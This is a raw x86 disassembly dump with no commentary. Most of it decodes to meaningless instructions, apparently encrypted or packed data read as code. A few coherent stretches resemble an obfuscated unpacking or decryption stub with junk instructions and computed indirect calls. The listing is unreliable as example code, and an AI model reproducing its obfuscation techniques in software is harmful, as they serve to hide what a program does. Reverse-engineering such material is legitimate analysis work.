  408bd9:	sbb    DWORD PTR [ebx+edi*1+0x3b],esi
  408bdd:	cld    
  408bde:	or     BYTE PTR [ebx],bh
  408be0:	add    eax,0xb7dd2525
  408be5:	fldcw  WORD PTR [edx-0x623bc349]
  408beb:	and    bl,BYTE PTR [esi+0x20]
  408bee:	mov    cl,0xd5
  408bf0:	outs   dx,DWORD PTR ds:[esi]
  408bf1:	xchg   ebx,eax
  408bf2:	fwait
  408bf3:	inc    eax
  408bf4:	xchg   esi,eax
  408bf5:	xor    edx,DWORD PTR [edi-0x26]
  408bf8:	adc    eax,0xa8741979
  408bfd:	jb     0x408bc4
  408bff:	mov    bh,0xb6
  408c01:	(bad)  
  408c02:	cmc    
  408c03:	bound  edi,QWORD PTR [edx-0x77]
  408c06:	(bad)  
  408c08:	add    esi,DWORD PTR [ebx+eiz*1-0x1b5a36e8]
  408c0f:	les    edi,FWORD PTR [edi]
  408c11:	mov    ebx,0x13f985a3
  408c16:	push   WORD PTR ds:0xa29b229d
  408c1d:	cmp    DWORD PTR [edx-0x389e882d],ebx
  408c23:	jno    0x408baa
  408c25:	test   DWORD PTR [ebx],eax
  408c27:	jmp    0xf6d7:0x37977e5
  408c2e:	test   DWORD PTR [ebp-0x20c06946],esp
  408c34:	cmp    edx,DWORD PTR [ebx+0x33]
  408c37:	add    BYTE PTR [ecx+edx*1],ch
  408c3a:	or     edi,esp
  408c3c:	shl    BYTE PTR [ecx-0x6dedfb8d],cl
  408c42:	int3   
  408c43:	xor    BYTE PTR [esp+eiz*2+0x2a],bh
  408c47:	and    esp,ebp
  408c49:	pop    edx
  408c4a:	xor    BYTE PTR [esi+0x34],bh
  408c4d:	inc    edi
  408c4e:	dec    esp
  408c4f:	pop    es
  408c50:	sbb    bl,bh
  408c52:	(bad)  
  408c53:	fmul   DWORD PTR [ecx]
  408c55:	inc    ebp
  408c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c57:	adc    BYTE PTR [ebx-0x2856dc6c],0x8e
  408c5e:	inc    eax
  408c5f:	push   esp
  408c60:	push   esp
  408c61:	popa   
  408c62:	int3   
  408c63:	retf   0x22b6
  408c66:	inc    eax
  408c67:	fdiv   DWORD PTR [eax+0x48]
  408c6a:	inc    ebx
  408c6b:	dec    edi
  408c6c:	adc    al,0x17
  408c6e:	jg     0x408c4f
  408c70:	les    eax,FWORD PTR ds:0x9f76a720
  408c76:	push   edi
  408c77:	test   al,0x54
  408c79:	leave  
  408c7a:	aad    0x20
  408c7c:	ret    
  408c7d:	popf   
  408c7e:	jmp    0x7e2f0c36
  408c83:	dec    eax
  408c84:	add    DWORD PTR [ebp-0x18],esi
  408c87:	pop    ebp
  408c88:	sbb    DWORD PTR [ecx-0x4],0x4c7367b9
  408c8f:	loop   0x408c1b
  408c91:	rol    BYTE PTR [edi-0x3418d4ed],1
  408c97:	cli    
  408c98:	inc    ecx
  408c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c9a:	es jg  0x408ce0
  408c9d:	pop    ds
  408c9e:	and    BYTE PTR [ebp+0x38],0x16
  408ca2:	jb     0x408cb8
  408ca4:	(bad)  [ebp-0x12]
  408ca7:	shr    BYTE PTR [esi+eax*2+0x28517279],0x11
  408caf:	arpl   bx,sp
  408cb1:	pop    edx
  408cb2:	(bad)  
  408cb3:	iret   
  408cb4:	adc    al,0x5c
  408cb6:	gs pop ebp
  408cb8:	push   edx
  408cb9:	xor    esi,ebp
  408cbb:	push   ds
  408cbc:	mov    cl,0x9b
  408cbe:	fimul  WORD PTR [ebx]
  408cc0:	mov    edi,0x6c51bb1f
  408cc5:	mov    cl,BYTE PTR [esi-0x3c70971c]
  408ccb:	jb     0x408ca0
  408ccd:	mov    eax,ds:0x4e43349
  408cd2:	xor    ah,BYTE PTR [ecx]
  408cd4:	jp     0x408d44
  408cd6:	(bad)  
  408cd7:	sti    
  408cd8:	wbinvd 
  408cda:	inc    esi
  408cdb:	rcr    DWORD PTR [ebx],0x49
  408cde:	int    0x61
  408ce0:	push   ecx
  408ce1:	cmp    al,0x8
  408ce3:	ins    BYTE PTR es:[edi],dx
  408ce4:	xlat   BYTE PTR ds:[ebx]
  408ce5:	arpl   di,bx
  408ce7:	int3   
  408ce8:	inc    ebx
  408ce9:	in     al,dx
  408cea:	shl    BYTE PTR [edi-0x3f33f02c],0xf3
  408cf1:	cs jb  0x408d55
  408cf4:	jb     0x408d36
  408cf6:	push   0xffffffdc
  408cf8:	stos   BYTE PTR es:[edi],al
  408cf9:	mov    BYTE PTR [ecx-0x69],al
  408cfc:	sbb    ebp,DWORD PTR [eax+0x7e9e9fc7]
  408d02:	xor    ch,dh
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ff71
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x203327cf
  408e55:	jb     0x408e03
  408e57:	adc    BYTE PTR [edx+0x2b626219],cl
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx+0x4e]
  408e61:	xchg   ecx,eax
  408e62:	mov    ecx,0x339a7ce3
  408e67:	leave  
  408e68:	adc    al,0xe2
  408e6a:	lock mov ecx,0xc5eca6a7
  408e70:	dec    ebx
  408e71:	imul   esi,esi,0x1a241a9f
  408e77:	ja     0x408e88
  408e79:	fst    DWORD PTR [ebx-0x28]
  408e7c:	es xchg ebp,eax
  408e7e:	mov    dl,0x52
  408e80:	push   ecx
  408e81:	cmp    dl,bh
  408e83:	xor    ebx,DWORD PTR [ebx+0x47]
  408e86:	call   0xbaba5bd0
  408e8b:	loopne 0x408e23
  408e8d:	stc    
  408e8e:	adc    esi,DWORD PTR [ecx+esi*2-0x2]
  408e92:	popf   
  408e93:	jo     0x408e32
  408e95:	mov    ah,0xdf
  408e97:	out    0x1,eax
  408e99:	into   
  408e9a:	call   FWORD PTR [ebp-0x10]
  408e9d:	push   cs
  408e9e:	cmp    al,0xa0
  408ea0:	add    eax,0xbb00dafb
  408ea5:	xor    BYTE PTR [edi+0x29],dl
  408ea8:	push   0xffffffc2
  408eaa:	mov    esi,0xdd3ffd11
  408eaf:	push   edx
  408eb0:	jg     0x408ed4
  408eb2:	and    eax,0xd9a37e74
  408eb7:	add    eax,0xe135c363
  408ebc:	pop    ds
  408ebd:	je     0x408e7c
  408ebf:	jmp    0x408e79
  408ec1:	ret    
  408ec2:	dec    ecx
  408ec3:	push   edx
  408ec4:	add    DWORD PTR [ebp+ebp*2-0x166c5939],0x2b
  408ecc:	adc    al,0x2c
  408ece:	test   eax,0xefc9a1ee
  408ed3:	xor    al,0x64
  408ed5:	or     cl,ah
  408ed7:	xchg   esi,eax
  408ed8:	data16 (bad) 
  408eda:	daa    
  408edb:	ins    BYTE PTR es:[edi],dx
  408edc:	(bad)
  408ee1:	xchg   ebp,eax
  408ee2:	or     BYTE PTR [edx-0x7441802d],0x96
  408ee9:	stc    
  408eea:	rol    ecx,0x19
  408eed:	mov    al,ds:0xadb5ce9a
  408ef2:	add    ch,bh
  408ef4:	pop    es
  408ef5:	jne    0x408f23
  408ef7:	inc    ecx
  408ef8:	xor    DWORD PTR [edi-0x66],edx
  408efb:	push   ss
  408efc:	xchg   DWORD PTR ds:0x5ede1a5c,edi
  408f02:	les    esp,FWORD PTR [esi+eax*2]
  408f05:	pop    es
  408f06:	push   edi
  408f07:	mov    ah,0x18
  408f09:	and    al,0xbd
  408f0b:	outs   dx,DWORD PTR ds:[esi]
  408f0c:	aad    0x51
  408f0e:	cdq    
  408f0f:	std    
  408f10:	(bad)  
  408f11:	ins    BYTE PTR es:[edi],dx
  408f12:	call   0xeee3b6a0
  408f17:	mov    al,0x24
  408f19:	push   0x9130354a
  408f1e:	imul   DWORD PTR [eax]
  408f20:	fdivp  st(2),st
  408f22:	pop    ds
  408f23:	icebp  
  408f24:	pop    edi
  408f25:	aam    0x30
  408f27:	test   al,0x32
  408f29:	dec    esp
  408f2a:	fsubr  DWORD PTR [edx*8-0x56f2b0c3]
  408f32:	push   edi
  408f33:	adc    al,0xf5
  408f35:	sahf   
  408f36:	mov    dh,dl
  408f38:	or     dh,dl
  408f3a:	mov    ebx,0x8b42276
  408f3f:	aaa    
  408f40:	dec    edi
  408f41:	jns    0x408fa3
  408f43:	mov    ah,0x8d
  408f45:	leave  
  408f46:	jecxz  0x408f72
  408f48:	xchg   BYTE PTR [ebp+0x58],dl
  408f4b:	xor    al,0x64
  408f4d:	pop    edx
  408f4e:	cwde   
  408f4f:	push   eax
  408f50:	lea    ebx,[ebp-0x48]
  408f53:	push   0xffffffa4
  408f55:	sti    
  408f56:	rcl    DWORD PTR [esi+ebx*2-0x471c7d7d],cl
  408f5d:	push   ds
  408f5e:	ret    
  408f5f:	mov    ds:0xa50d33c7,al
  408f64:	loopne 0x408eee
  408f66:	dec    ebx
  408f67:	(bad)  [edx]
  408f69:	cmp    BYTE PTR [edi-0x64],0x4
  408f6d:	les    esi,FWORD PTR [ebx]
  408f6f:	jl     0x408fa6
  408f71:	and    eax,0x65306f74
  408f76:	sub    al,0x38
  408f78:	lods   al,BYTE PTR ds:[esi]
  408f79:	loopne 0x408f5a
  408f7b:	sbb    eax,0x3a79a56d
  408f80:	scas   al,BYTE PTR es:[edi]
  408f81:	nop
  408f82:	inc    ebp
  408f83:	pop    esp
  408f84:	loope  0x408f73
  408f86:	xor    ebp,DWORD PTR [eax+0x4a50e5fb]
  408f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8d:	clc    
  408f8e:	xchg   ebx,eax
  408f8f:	int3   
  408f90:	neg    BYTE PTR [esi]
  408f92:	inc    edx
  408f93:	popf   
  408f94:	cmc    
  408f95:	push   cs
  408f96:	mov    ah,0xd4
  408f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f99:	test   dh,bl
  408f9b:	out    dx,eax
  408f9c:	mov    ebx,0x8f49cfba
  408fa1:	mov    BYTE PTR [eax+0x4],0x72
  408fa5:	inc    ecx
  408fa6:	cmp    BYTE PTR [esi-0x10],al
  408fa9:	mov    ds:0x28984090,al
  408fae:	das    
  408faf:	inc    edx
  408fb0:	ja     0x409014
  408fb2:	call   0xbadf1afa
  408fb7:	dec    edi
  408fb8:	rcr    ch,cl
  408fba:	push   ds
  408fbb:	push   eax
  408fbc:	pop    ecx
  408fbd:	cwde   
  408fbe:	ins    BYTE PTR es:[edi],dx
  408fbf:	hlt    
  408fc0:	and    ah,BYTE PTR [eax]
  408fc2:	sbb    BYTE PTR ds:0xf1468c3,cl
  408fc8:	ss jmp 0xb056:0x72c19a7d
  408fd0:	ja     0x408fea
  408fd2:	push   edx
  408fd3:	mov    ds:0xc3b99cf1,eax
  408fd8:	(bad)  
  408fd9:	test   al,0x50
  408fdb:	ins    BYTE PTR es:[edi],dx
  408fdc:	xchg   esi,eax
  408fdd:	mov    eax,ds:0xdd7b6b31
  408fe2:	jbe    0x409009
  408fe4:	nop
  408fe5:	je     0x408f9a
  408fe7:	fs (bad) 
  408fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fea:	test   al,0x43
  408fec:	inc    edi
  408fed:	push   es
  408fee:	test   BYTE PTR [ebx-0x3042dcf3],bh
  408ff4:	dec    esp
  408ff5:	test   DWORD PTR [edx],0x58a805c8
  408ffb:	cmp    dh,BYTE PTR [ebx]
  408ffd:	inc    ebp
  408ffe:	test   esi,eax
  409000:	aas    
  409001:	sahf   
  409002:	mov    ds:0x15f49ce0,eax
  409007:	xchg   esp,eax
  409008:	or     DWORD PTR [ebx],edx
  40900a:	enter  0x34ec,0xba
  40900e:	mov    esi,0x90a9575f
  409013:	jl     0x409015
  409015:	(bad)
  409018:	ret    
  409019:	mov    fs,WORD PTR [esi]
  40901b:	lods   al,BYTE PTR ds:[esi]
  40901c:	fisttp DWORD PTR [ebp+0x7dbde8a]
  409022:	mov    eax,0xebad770e
  409027:	add    edi,edi
  409029:	cmp    ebp,DWORD PTR [edx+esi*2]
  40902c:	out    dx,al
  40902d:	cs mov ebp,0x38085de8
  409033:	and    eax,0x8233f714
  409038:	dec    edx
  409039:	loopne 0x408fd1
  40903b:	xchg   edx,eax
  40903c:	xor    al,0xf9
  40903e:	in     eax,dx
  40903f:	shl    dh,1
  409041:	pop    ebp
  409042:	scas   eax,DWORD PTR es:[edi]
  409043:	and    al,BYTE PTR [eax-0x45536d57]
  409049:	sbb    bh,BYTE PTR [edi+0x2e]
  40904c:	add    DWORD PTR [ebx+0x41],esi
  40904f:	lahf   
  409050:	jge    0x408ff7
  409052:	loop   0x4090d2
  409054:	push   edi
  409055:	jmp    0xfce9ac01
  40905a:	inc    esp
  40905b:	test   DWORD PTR [eax-0x61],edx
  40905e:	lods   al,BYTE PTR ds:[esi]
  40905f:	jle    0x40902c
  409061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409062:	rcr    DWORD PTR [ebx+ebp*1-0x382a6cc3],cl
  409069:	adc    al,0xdb
  40906b:	dec    edx
  40906c:	test   al,0x86
  40906e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409070:	outs   dx,BYTE PTR ds:[esi]
  409071:	push   ebx
  409072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409073:	jmp    FWORD PTR [eax]
  409075:	arpl   WORD PTR [ebx-0x1af68387],dx
  40907b:	adc    eax,0xead9847b
  409080:	dec    edi
  409081:	loope  0x409078
  409083:	add    ah,BYTE PTR ds:0x4751547
  409089:	test   dh,dh
  40908b:	cli    
  40908c:	inc    edi
  40908d:	ret    
  40908e:	scas   eax,DWORD PTR es:[edi]
  40908f:	fisubr DWORD PTR [ecx]
  409091:	fdiv   QWORD PTR [eax+0x141a120]
  409097:	push   ds
  409098:	(bad)  
  409099:	push   0xf87870fa
  40909e:	jnp    0x409046
  4090a0:	dec    edi
  4090a1:	jnp    0x4090b5
  4090a3:	arpl   WORD PTR [ecx+0x2c],cx
  4090a6:	fcom   QWORD PTR [edx]
  4090a8:	fs dec ebx
  4090aa:	sub    al,0x5d
  4090ac:	fisttp QWORD PTR [esi]
  4090ae:	in     eax,dx
  4090af:	sbb    dl,bl
  4090b1:	push   0xffffffd8
  4090b3:	push   cs
  4090b4:	add    al,0x94
  4090b6:	test   dl,0xd8
  4090b9:	aad    0x17
  4090bb:	or     edi,DWORD PTR [esp+ecx*2]
  4090be:	inc    esi
  4090bf:	cmp    DWORD PTR [edx+0xd],edx
  4090c2:	icebp  
  4090c3:	xchg   BYTE PTR [eax],bh
  4090c5:	xor    edi,DWORD PTR [esi+esi*1-0x50]
  4090c9:	add    eax,DWORD PTR [esp+eax*2]
  4090cc:	mov    bh,0x45
  4090ce:	adc    BYTE PTR [edi+0x10951f38],ch
  4090d4:	add    al,0x12
  4090d6:	(bad)  
  4090d7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4090d9:	pop    ecx
  4090da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090db:	add    BYTE PTR [eax+edx*1+0x443b8e0d],dh
  4090e2:	mov    ch,BYTE PTR [esp+eiz*4-0x7a82e9f2]
  4090e9:	cdq    
  4090ea:	ds and al,0xad
  4090ed:	arpl   cx,dx
  4090ef:	imul   edi,DWORD PTR [eax+0x109566ae],0xca5669dd
  4090f9:	mov    WORD PTR [edx],?
  4090fb:	jle    0x40917b
  4090fd:	call   0xaec3:0x48c345e9
  409104:	inc    esi
  409105:	mov    ebp,gs
  409107:	retf   0x958d
  40910a:	outs   dx,DWORD PTR ds:[esi]
  40910b:	cmp    al,BYTE PTR [edx-0x58]
  40910e:	mov    ah,BYTE PTR [esi+eiz*8+0x62]
  409112:	call   0x99e0:0xce13cb43
  409119:	xlat   BYTE PTR ds:[ebx]
  40911a:	adc    BYTE PTR [eax+0x27da119e],al
  409120:	xchg   edx,eax
  409121:	or     BYTE PTR [edi-0x16],dl
  409124:	cmp    bh,al
  409126:	aaa    
  409127:	push   edx
  409128:	icebp  
  409129:	or     esi,DWORD PTR [edi+0x25]
  40912c:	repz in eax,0xa5
  40912f:	aaa    
  409130:	and    DWORD PTR [eax+ebp*2-0x17],0x52
  409135:	dec    esi
  409136:	adc    edx,DWORD PTR [edx+0x400f8230]
  40913c:	sub    DWORD PTR [edi],edx
  40913e:	mov    esp,0x68f01dcf
  409143:	mov    edx,0x19a088af
  409148:	mov    BYTE PTR [ecx+0xe],cl
  40914b:	das    
  40914c:	add    edx,edx
  40914e:	xor    DWORD PTR [esi-0x3fea9b51],ebp
  409154:	stc    
  409155:	pop    eax
  409156:	jae    0x4091b5
  409158:	push   esp
  409159:	mov    bl,0xc
  40915b:	test   BYTE PTR [esi],ah
  40915d:	sbb    eax,0x28bc8853
  409162:	(bad)  
  409163:	dec    eax
  409164:	jo     0x409115
  409166:	call   0x3098:0x7ed985f4
  40916d:	popf   
  40916e:	fdivr  QWORD PTR [ebx-0x467cae3e]
  409174:	add    DWORD PTR [ebx],esi
  409176:	xchg   edi,eax
  409177:	ins    BYTE PTR es:[edi],dx
  409178:	adc    BYTE PTR [ebx+0x36fca63e],ah
  40917e:	jae    0x4091cc
  409180:	mov    dl,0x3e
  409182:	mov    ebx,0xff591faa
  409187:	cmp    BYTE PTR [eax-0x65],al
  40918a:	into   
  40918b:	es scas al,BYTE PTR es:[edi]
  40918d:	xor    eax,0x625d874b
  409192:	(bad)  
  409193:	jnp    0x40920d
  409195:	jecxz  0x409126
  409197:	sbb    DWORD PTR [ecx+0xc857f50],ebp
  40919d:	fwait
  40919e:	mov    al,0x0
  4091a0:	add    esp,DWORD PTR [ebx-0x4f]
  4091a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091a4:	(bad)  
  4091a5:	adc    BYTE PTR [eax-0x6f],bl
  4091a8:	mov    ds:0xc056eee0,eax
  4091ad:	lock (bad) 
  4091af:	dec    esp
  4091b0:	int3   
  4091b1:	pop    esi
  4091b2:	shl    BYTE PTR [edx],cl
  4091b4:	mov    edx,0x5fa7ea94
  4091b9:	ins    BYTE PTR es:[edi],dx
  4091ba:	mul    BYTE PTR [esi-0x59]
  4091bd:	push   ds
  4091be:	jns    0x40914c
  4091c0:	call   0xb5e6f25d
  4091c5:	and    al,0x1f
  4091c7:	ss ins BYTE PTR es:[edi],dx
  4091c9:	jno    0x40915e
  4091cb:	pop    edi
  4091cc:	cmc    
  4091cd:	js     0x4091d3
  4091cf:	adc    BYTE PTR [esi-0x2f81a0b4],ah
  4091d5:	jo     0x409161
  4091d7:	mov    ebp,0x875f14c
  4091dc:	stos   BYTE PTR es:[edi],al
  4091dd:	test   BYTE PTR [esi-0x5fe48a49],bl
  4091e3:	shr    DWORD PTR [edi],0xb
  4091e6:	(bad)  
  4091e8:	xchg   edx,eax
  4091e9:	cmp    eax,0xd44886a8
  4091ee:	push   eax
  4091ef:	rol    ebp,0x7b
  4091f2:	jbe    0x4091a7
  4091f4:	enter  0xcd09,0x97
  4091f8:	pop    ecx
  4091f9:	mov    dl,0x36
  4091fb:	cmc    
  4091fc:	rcl    BYTE PTR [esi+0xd5f6871],cl
  409202:	inc    ecx
  409203:	rol    BYTE PTR [ebx+0xf],0x88
  409207:	call   0xe185:0x19eef93
  40920e:	push   ebp
  40920f:	add    al,0x95
  409211:	jb     0x40923b
  409213:	pop    ebp
  409214:	xor    eax,0x33da847b
  409219:	sbb    al,0xdc
  40921b:	mov    ecx,0x627b43cc
  409220:	push   esp
  409221:	lods   al,BYTE PTR ds:[esi]
  409222:	xor    BYTE PTR [edi+0xb86aa1],ch
  409228:	inc    ebx
  409229:	jbe    0x40929a
  40922b:	not    BYTE PTR [esi-0x54fa9c9e]
  409231:	outs   dx,DWORD PTR ds:[esi]
  409232:	xlat   BYTE PTR ds:[ebx]
  409233:	jne    0x409237
  409235:	stos   BYTE PTR es:[edi],al
  409236:	iret   
  409237:	mov    bh,0x41
  409239:	in     al,0x33
  40923b:	xchg   DWORD PTR fs:[esi-0x65d707e2],esi
  409242:	push   0x5c383c24
  409247:	mov    al,ds:0x8821b8bc
  40924c:	pop    esi
  40924d:	sub    eax,0xc484d619
  409252:	mov    ch,0x6a
  409254:	iret   
  409255:	(bad)  
  409257:	mov    esp,0x3adc125e
  40925c:	or     eax,0x70078d81
  409261:	inc    esi
  409262:	in     eax,dx
  409263:	dec    ebx
  409264:	or     DWORD PTR [ebx-0xa],ebx
  409267:	clc    
  409268:	mov    ds:0xab20f95c,al
  40926d:	scas   al,BYTE PTR es:[edi]
  40926e:	leave  
  40926f:	outs   dx,DWORD PTR ds:[esi]
  409270:	jecxz  0x40924a
  409272:	cli    
  409273:	out    0x23,al
  409275:	push   ecx
  409276:	jle    0x409231
  409278:	cmp    dh,BYTE PTR [edx-0x59c9c495]
  40927e:	xor    dh,BYTE PTR [eax-0x5def3a29]
  409284:	xchg   ebp,eax
  409285:	mov    bh,0x92
  409287:	pop    ss
  409288:	js     0x409231
  40928a:	dec    edi
  40928b:	sub    ecx,eax
  40928d:	xor    eax,0x41393f83
  409292:	dec    edi
  409293:	fdivr  DWORD PTR [edi]
  409295:	sub    eax,DWORD PTR [ecx-0x2dd42b9f]
  40929b:	test   al,0x6b
  40929d:	out    0x4d,al
  40929f:	and    cl,cl
  4092a1:	xchg   esp,eax
  4092a2:	dec    ebp
  4092a3:	and    BYTE PTR [edi+esi*2+0x57],0x80
  4092a8:	mov    ah,al
  4092aa:	das    
  4092ab:	sti    
  4092ac:	retf   
  4092ad:	cmp    BYTE PTR [esi+0xa],dh
  4092b0:	mov    ah,0x4f
  4092b2:	jno    0x40932a
  4092b4:	or     al,0x7e
  4092b6:	shr    DWORD PTR [eax+0x6],0xaf
  4092ba:	cdq    
  4092bb:	jo     0x4092e4
  4092bd:	ficom  WORD PTR [esi]
  4092bf:	pop    ss
  4092c0:	sub    eax,0xcd5bd4fb
  4092c5:	sub    eax,0x75075b6b
  4092ca:	sub    cl,bh
  4092cc:	dec    esp
  4092cd:	adc    esi,esi
  4092cf:	shl    DWORD PTR [esi],0xe4
  4092d2:	mov    DWORD PTR [esi-0x7c],eax
  4092d5:	cmp    al,0xf8
  4092d7:	sbb    DWORD PTR [edx-0x5b2da2b0],0x43cf22af
  4092e1:	jge    0x4092ca
  4092e3:	dec    eax
  4092e4:	lods   al,BYTE PTR ds:[esi]
  4092e5:	dec    ebp
  4092e6:	ret    
  4092e7:	ins    BYTE PTR es:[edi],dx
  4092e8:	out    0x46,eax
  4092ea:	sub    BYTE PTR [ebx],dh
  4092ec:	loopne 0x40928f
  4092ee:	mov    ?,WORD PTR [ebx-0xd]
  4092f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f2:	pop    esp
  4092f3:	xchg   edx,eax
  4092f4:	pop    ebp
  4092f5:	ror    BYTE PTR [ecx],cl
  4092f7:	cmp    al,0x21
  4092f9:	jne    0x409327
  4092fb:	outs   dx,BYTE PTR ds:[esi]
  4092fc:	pop    es
  4092fd:	add    BYTE PTR [esi+0x3f],bl
  409300:	jbe    0x409297
  409302:	mov    al,ds:0xfb6839d6
  409307:	cli    
  409308:	in     al,dx
  409309:	pop    ebp
  40930a:	add    DWORD PTR ds:0xe137659a,esp
  409310:	add    eax,0x4cc0fa06
  409315:	jnp    0x40930e
  409317:	and    al,0x5f
  409319:	in     al,0x9a
  40931b:	push   ebx
  40931c:	xor    ch,BYTE PTR [esi+0x61]
  40931f:	(bad)  
  409321:	retf   0xd05d
  409324:	cmp    al,BYTE PTR [edx+0x2d87f705]
  40932a:	(bad)  
  40932b:	lea    esi,[esi-0x18bc8433]
  409331:	pop    ecx
  409332:	pop    ecx
  409333:	ins    BYTE PTR es:[edi],dx
  409334:	cwde   
  409335:	fnstenv ds:0x53a4e0bf
  40933b:	sahf   
  40933c:	test   eax,0xb39b9a7
  409341:	xchg   dx,ax
  409343:	ja     0x4092e7
  409345:	pop    ss
  409346:	dec    edi
  409347:	jb     0x409395
  409349:	ins    BYTE PTR es:[edi],dx
  40934a:	stos   DWORD PTR es:[edi],eax
  40934b:	stc    
  40934c:	mov    DWORD PTR [ebx-0xea10d8d],esi
  409352:	rcl    DWORD PTR [eax+0x6e],0x2f
  409356:	ins    DWORD PTR es:[edi],dx
  409357:	icebp  
  409358:	and    BYTE PTR [esi+0x2c633c5d],bh
  40935e:	(bad)  
  40935f:	sti    
  409360:	out    0x48,eax
  409362:	bound  edi,QWORD PTR [ebx]
  409364:	sub    eax,ebx
  409366:	mov    eax,ds:0xbe0f1a7b
  40936b:	jmp    0xbc9a:0x30e8253
  409372:	dec    eax
  409373:	loop   0x40931a
  409375:	call   0x337bc221
  40937a:	pop    ss
  40937b:	inc    edx
  40937c:	inc    esi
  40937d:	loopne 0x4093fe
  40937f:	xor    DWORD PTR [ebp-0xfc2e175],eax
  409385:	mov    bl,0xf2
  409387:	add    al,0x3d
  409389:	es xor esp,esp
  40938c:	jecxz  0x4093cd
  40938e:	lds    edi,FWORD PTR [eax]
  409390:	inc    ecx
  409391:	xchg   ebp,eax
  409392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409393:	in     al,0xe0
  409395:	adc    eax,0xa8d9d73e
  40939a:	(bad)  ds:0xfdd215f2
  4093a0:	loope  0x4093ed
  4093a2:	add    ebp,DWORD PTR [eax]
  4093a4:	enter  0x7179,0x66
  4093a8:	sbb    al,0x5a
  4093aa:	es xor eax,0xc9b543ac
  4093b0:	mov    al,0x45
  4093b2:	mov    dh,0xe1
  4093b4:	sahf   
  4093b5:	into   
  4093b6:	add    eax,0x4a511be
  4093bb:	(bad)
  4093be:	ins    BYTE PTR es:[edi],dx
  4093bf:	icebp  
  4093c0:	sub    al,0x26
  4093c2:	pop    es
  4093c3:	icebp  
